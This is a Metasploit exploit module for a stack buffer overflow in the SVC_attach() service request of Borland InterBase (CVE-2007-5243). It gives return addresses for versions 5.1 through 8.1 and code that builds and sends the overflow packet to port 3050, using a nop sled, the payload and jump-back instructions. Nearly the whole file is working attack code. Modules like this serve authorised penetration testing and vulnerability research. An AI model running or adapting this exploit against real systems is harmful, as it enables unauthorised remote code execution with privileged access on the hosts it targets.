##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::BruteTargets

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Borland InterBase SVC_attach() Buffer Overflow',
      'Description'	=> %q{
        This module exploits a stack buffer overflow in Borland InterBase
        by sending a specially crafted service attach request.
      },
      'Author'	=>
        [
          'Ramon de C Valle',
          'Adriano Lima <adriano[at]risesecurity.org>',
        ],
      'Arch'		=> ARCH_X86,
      'Platform'	=> 'win',
      'References'	=>
        [
          [ 'CVE', '2007-5243' ],
          [ 'OSVDB', '38605' ],
          [ 'BID', '25917' ],
          [ 'URL', 'http://www.risesecurity.org/advisories/RISE-2007002.txt' ],
        ],
      'Privileged'	=> true,
      'License'	=> MSF_LICENSE,
      'Payload'	=>
        {
          'Space' => 512,
          'BadChars' => "\x00\x2f\x3a\x40\x5c",
          'StackAdjustment' => -3500,
        },
      'Targets'	=>
        [
          [ 'Brute Force', { } ],
          # 0x00403d4b pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V8.1.0.257',
            { 'Length' => [ 3660, 3664 ], 'Ret' => 0x00403d4b }
          ],
          # 0x00403d4d pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V8.0.0.123',
            { 'Length' => [ 3660, 3664 ], 'Ret' => 0x00403d4d }
          ],
          # 0x00403a5d pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V7.5.0.129 WI-V7.5.1.80',
            { 'Length' => [ 3660, 3664 ], 'Ret' => 0x00403a5d }
          ],
          # 0x004038fd pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V7.0.1.1',
            { 'Length' => [ 3660, 3664 ], 'Ret' => 0x004038fd }
          ],
          # 0x0040390d pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V6.5.0.28',
            { 'Length' => [ 2116, 2120], 'Ret' => 0x0040390d }
          ],
          # 0x00403901 pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V6.0.1.6',
            { 'Length' => [ 2116, 2120 ], 'Ret' => 0x00403901 }
          ],
          # 0x004038b1 pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V6.0.0.627 WI-V6.0.1.0 WI-O6.0.1.6 WI-O6.0.2.0',
            { 'Length' => [ 2116, 2120 ], 'Ret' => 0x004038b1 }
          ],
          # 0x00404a10 pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V5.5.0.742',
            { 'Length' => [ 2216, 2120 ], 'Ret' => 0x00404a10 }
          ],
          # 0x00404a0e pop esi; pop ebp; ret
          [
            'Borland InterBase WI-V5.1.1.680',
            { 'Length' => [ 2120, 2124 ], 'Ret' => 0x00404a0e }
          ],
          # Debug
          [
            'Debug',
            { 'Length' => [ 2120 ], 'Ret' => 0xaabbccdd }
          ],
        ],
      'DefaultTarget'	=> 0,
      'DisclosureDate'  => '2007-10-03'
    ))

    register_options(
      [
        Opt::RPORT(3050)
      ],
      self.class
    )

  end

  def exploit_target(target)

    target['Length'].each do |length|

      connect

      # Service attach
      op_service_attach = 82

      remainder = length.remainder(4)
      padding = 0

      if remainder > 0
        padding = (4 - remainder)
      end

      buf = ''

      # Operation/packet type
      buf << [op_service_attach].pack('N')

      # Id
      buf << [0].pack('N')

      # Length
      buf << [length].pack('N')

      # Nop block
      buf << make_nops(length - payload.encoded.length - 13)

      # Payload
      buf << payload.encoded

      # Jump back into the nop block
      buf << "\xe9" + [-1028].pack('V')

      # Jump back
      buf << "\xeb" + [-7].pack('c')

      # Random alpha data
      buf << rand_text_alpha(2)

      # Target
      buf << [target.ret].pack('V')

      # Padding
      buf << "\x00" * padding

      # Database parameter block

      # Length
      buf << [1024].pack('N')

      # Random alpha data
      buf << rand_text_alpha(1024)

      sock.put(buf)

      select(nil,nil,nil,4)

      handler

    end

  end
end
